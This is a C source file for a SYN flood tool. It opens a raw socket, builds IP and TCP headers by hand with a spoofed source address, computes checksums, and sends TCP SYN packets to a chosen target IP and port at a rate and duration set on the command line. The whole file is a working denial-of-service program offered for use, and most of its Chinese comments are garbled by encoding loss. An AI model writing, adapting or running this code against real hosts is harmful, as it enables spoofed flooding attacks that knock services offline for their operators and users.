/******************************************
FILE: 		syn-flood.c
author:		yaxinsn
version:		1

desception:   the raw of socket send IP TCP special packet.
			so this progam send tcp syn packet. so 

key function:	
			checksum
			parse_option
lib example:	getopt_long,socket.sendto.

                   _ooOoo_
                  o8888888o
                  88" . "88
                  (| -_- |)
                  O\  =  /O
               ____/`---'\____
             .'  \\|     |//  `.
            /  \\|||  :  |||//  \
           /  _||||| -:- |||||-  \
           |   | \\\  -  /// |   |
           | \_|  ''\---/''  |   |
           \  .-\__  `-`  ___/-. /
         ___`. .'  /--.--\  `. . __
      ."" '<  `.___\_<|>_/___.'  >'"".
     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
     \  \ `-.   \_ __\ /__ _/   .-` /  /
======`-.____`-.___\_____/___.-`____.-'======
                   `=---='
          Buddha bless never BUG
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

******************************************/



#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <sys/time.h>


#include <stdio.h> /* for printf */
#include <stdlib.h> /* for exit */
#include <getopt.h>
#include <unistd.h>

/* inet_addr */
#include <netinet/in.h>
#include <arpa/inet.h>


/**************************************************
			struct define
****************************************************/

typedef unsigned short  USHORT;
typedef unsigned char  UCHAR;
typedef struct _iphdr   /* ����IP�ײ� */
{
  unsigned char h_verlen;   /*4λ�ײ�����,4λIP�汾�� */
  unsigned char tos;   //8λ��������TOS
  unsigned short total_len; //16λ�ܳ��ȣ��ֽڣ�
  unsigned short ident;   //16λ��ʶ
  unsigned short frag_and_flags; //3λ��־λ
  unsigned char ttl;   //8λ����ʱ�� TTL
  unsigned char proto;   //8λЭ�� (TCP, UDP ������)
  unsigned short checksum; //16λIP�ײ�У���
  unsigned int sourceIP;   //32λԴIP��ַ
  unsigned int destIP;   //32λĿ��IP��ַ
}IP_HEADER;
struct     //����TCPα�ײ�
{
  unsigned long saddr; //Դ��ַ
  unsigned long daddr; //Ŀ�ĵ�ַ
  char mbz;
  char ptcl;   //Э������
  unsigned short tcpl; //TCP����
}psd_header;
typedef struct _tcphdr   //����TCP�ײ�
{
	USHORT th_sport;   //16λԴ�˿�
	USHORT th_dport;   //16λĿ�Ķ˿�
	unsigned int th_seq;   //32λ���к�
	unsigned int th_ack;   //32λȷ�Ϻ�
	unsigned char th_lenres; //4λ�ײ�����/6λ������
	unsigned char th_flag;   //6λ��־λ
	USHORT th_win;   //16λ���ڴ�С
	USHORT th_sum;   //16λУ���
	USHORT th_urp;   //16λ��������ƫ����
}TCP_HEADER;

/**************************************************
			Macro define
****************************************************/

#define SEQ 			0x28376839
#define SYN_DEST_IP	 	"192.168.100.1"	/*��������IP */
#define FAKE_IP		 	"10.1.1.2" 
#define STATUS_FAILED 	0xFFFF /* ���󷵻�ֵ */


#define INVALID_SOCKET -1
#define  SOCKET_ERROR  -1

/**************************************************
			sub function declare
****************************************************/


/**************************************************
			sub function define
****************************************************/


/**************************************************
desc: 	count ip's head and tcp's body checksum
intput:  
		buffer: a some binary data
		size:  num of bytes
output:
	sum key
return:
****************************************************/

/* CheckSum:����У��͵��Ӻ��� */
USHORT checksum(USHORT *buffer, int size) 
{ 
  unsigned long cksum=0;
  while(size >1) {
    cksum+=*buffer++;
    size -=sizeof(USHORT);
  }
  if(size ) {
    cksum += *(UCHAR*)buffer;
  }
  cksum = (cksum >> 16) + (cksum & 0xffff);
  cksum += (cksum >>16);
  return (USHORT)(~cksum);
}
int ExitProcess(int code)
{
  	exit(code);
}
struct synflood_config{
  	unsigned int 		sip;   //32λԴIP��ַ
  	unsigned int 		dip;   //32λĿ��IP��ַ	
  	unsigned short 		dport;
	unsigned short 		sport;
	unsigned int 		multi_ip;
	unsigned int 		time;
	unsigned int 		freq;
};

/*  SynFlood������ */
int syn_flood(struct synflood_config* cfg )
{
  int datasize,flag;
  int err_code;
  struct timeval TimeOut={2000,0};
  int SendSEQ=0;
  char SendBuf[128]={0};
 // char RecvBuf[65535]={0};
  int i;
  int j;
  int sock_raw = 0;
  struct sockaddr_in DestAddr;
  IP_HEADER ip_header;
  TCP_HEADER tcp_header;
  
  sock_raw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if (sock_raw==INVALID_SOCKET){
    fprintf(stderr,"WSASocket() failed: %d\n",errno);
    ExitProcess(STATUS_FAILED);
  }
  flag=1;
  //����IP_HDRINCL���Լ����IP�ײ�
  err_code=setsockopt(sock_raw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
  if (err_code==SOCKET_ERROR)
     printf("Set IP_HDRINCL Error!\n");

  //���÷��ͳ�ʱ
  err_code=setsockopt(sock_raw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
  if(err_code==SOCKET_ERROR){
    fprintf(stderr,"Failed to set send TimeOut: %d\n",errno);
    perror("setsockopt:");
    ExitProcess(STATUS_FAILED);
  }
  memset(&DestAddr,0,sizeof(DestAddr));
  DestAddr.sin_family=AF_INET;
 // DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);
  DestAddr.sin_addr.s_addr= htonl(cfg->dip);

  //���IP�ײ�
  ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long));
  //����λIP�汾�ţ�����λ�ײ�����
  ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16λ�ܳ��ȣ��ֽڣ�
  ip_header.ident=1;         					//16λ��ʶ
  ip_header.frag_and_flags=0;         //3λ��־λ
  ip_header.ttl=128;        				 //8λ����ʱ��TTL
  ip_header.proto=IPPROTO_TCP;       //8λЭ��(TCP,UDP��)
  ip_header.checksum=0;        			 //16λIP�ײ�У���
  //ip_header.sourceIP=htonl(fake_ip_host+SendSEQ);     //32λԴIP��ַ
  //ip_header.destIP=inet_addr(SYN_DEST_IP);     			//32λĿ��IP��ַ
  ip_header.sourceIP=htonl(cfg->sip);     //32λԴIP��ַ
  ip_header.destIP=htonl(cfg->dip);     			//32λĿ��IP��ַ
  //���TCP�ײ�

  tcp_header.th_sport=htons(cfg->sport);       //Դ�˿ں�
  tcp_header.th_dport=htons(cfg->dport);       //Ŀ�Ķ˿ں�
  tcp_header.th_seq=htonl(SEQ+SendSEQ);  //SYN���к�
  tcp_header.th_ack=0;         //ACK���к���Ϊ0
  tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);     //TCP���Ⱥͱ���λ
  tcp_header.th_flag=2;         /* SYN ��־ */
  tcp_header.th_win=htons(16384);       /* ���ڴ�С */
  tcp_header.th_urp=0;         //ƫ��
  tcp_header.th_sum=0;         //У���
  /* ���TCPα�ײ������ڼ���У��ͣ������������ͣ� */
  psd_header.saddr=ip_header.sourceIP;                         //Դ��ַ
  psd_header.daddr=ip_header.destIP;                         //Ŀ�ĵ�ַ
  psd_header.mbz=0;
  psd_header.ptcl=IPPROTO_TCP;                             //Э������
  psd_header.tcpl=htons(sizeof(tcp_header));                     //TCP�ײ�����
  
  
  printf(". cfg->time %d\n",cfg->time);
  printf("* cfg->freq %d\n",cfg->freq);
  	
  for(i = 0; i < cfg->time; i++)
  {
 	printf(".");
  	for(j = 0; j < cfg->freq; j++)
  	{
		
		if(SendSEQ++==65536) 
			SendSEQ=1;       //���к�ѭ��
		/* ����IP�ײ� */
		ip_header.checksum=0;
		//ip_header.sourceIP=htonl(cfg->sip+(j+1)*(i+1));   //32λԴIP��ַ
		ip_header.sourceIP=htonl(cfg->sip);   /* 32λԴIP��ַ */
		/* ����TCP�ײ� */
		tcp_header.th_seq=htonl(SEQ+SendSEQ);     //SYN���к�
		tcp_header.th_sum=0;       //У���
		//����TCP Pseudo Header
		psd_header.saddr=ip_header.sourceIP;   
		/* ����TCPУ���http://www.cwqq.org������У���ʱ��Ҫ����TCP pseudo header    */
		memcpy(SendBuf,&psd_header,sizeof(psd_header)); 
		memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header));
		tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header));
		
		/* ����IPУ��� */
		memcpy(SendBuf,&ip_header,sizeof(ip_header));
		memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header));
		memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4);
		datasize = sizeof(ip_header)+sizeof(tcp_header);
		ip_header.checksum=checksum((USHORT *)SendBuf,datasize);
		
		//��䷢�ͻ�����
		memcpy(SendBuf,&ip_header,sizeof(ip_header));
		//����TCP����
		err_code=sendto(sock_raw,SendBuf,datasize,0,(struct sockaddr*) &DestAddr, sizeof(DestAddr));
		if (err_code == SOCKET_ERROR)
			printf("\nSend Error:%d\n",errno);
		
		
		usleep(1000*1000/cfg->freq);
	}
  }//End of While

   close(sock_raw);
return 0;
}

void useage(void)
{
	printf("synflood --dip x.x.x.x --sip y.y.y.y --dport dport --sport sport  -t time -f freq \n"
		"default dport 8888 sport 9999 time 10 freq 100\n");
}


int parse_option(int argc, char **argv,struct synflood_config* cfg) 
{
	int c;
	//int digit_optind = 0;

	while (1)
	{
		//int this_option_optind = optind ? optind : 1;
		int option_index = 0;
		static struct option long_options[] = {
		{"dip", 1, 0, 0},
		{"sip", 1, 0, 0},
		{"dport", 1, 0, 0},
		{"sport", 1, 0, 0},
		{0, 0, 0, 0}
		};
		c = getopt_long (argc, argv, "t:f:h", long_options, &option_index);
		if (c == -1)
		break;
		
		switch (c) 
		{
			case 0:
			//printf ("option %s", long_options[option_index].name);
			if (optarg){
			//	printf (" with arg %s\n", optarg);
				switch (option_index)
				{
					case 0: //dip
						cfg->dip = inet_addr(optarg);
						cfg->dip = htonl(cfg->dip);
					break;
					case 1: //sip
						cfg->sip = inet_addr(optarg);
						cfg->sip = htonl(cfg->sip); //host endian
					break;
					case 2: //dport
						cfg->dport = atoi(optarg); //host endian
					break;
					case 3: //sport
						cfg->sport = atoi(optarg);
					break;
				}
			}
			break;
			
			case 't':
				cfg->time = atoi(optarg);
				//printf ("option t with value <%s> \n", optarg);
			break;
			case 'f':
				cfg->freq = atoi(optarg);
				//printf ("option f with value <%s> \n", optarg);
			break;
		case 'h':;
				useage();
				exit(0);
			break;				
			case '?':
				printf ("return option ? <%s> \n", optarg);
			break;
			
			default:
				printf (" getopt returned character code 0%o \n", c);
		}
	}

	if (optind < argc) 
	{
		printf ("non-option ARGV-elements: ");
		while (optind < argc)
		printf ("%s ", argv[optind++]);
		printf ("\n");
	}
	return 0;
}
int main(int argc,char** argv)
{
	struct synflood_config cfg;
	memset(&cfg,0,sizeof(cfg));
	cfg.dport = 8888;
	cfg.sport = 9999;
	cfg.dip  = inet_addr(SYN_DEST_IP);
	cfg.dip = htonl(cfg.dip);
	
	cfg.time = 10;
	cfg.freq = 100;
	cfg.sip  = inet_addr(FAKE_IP);
	cfg.sip = htonl(cfg.sip);
	
	parse_option(argc , argv, &cfg);
	
	syn_flood(&cfg);
	return 0;
}
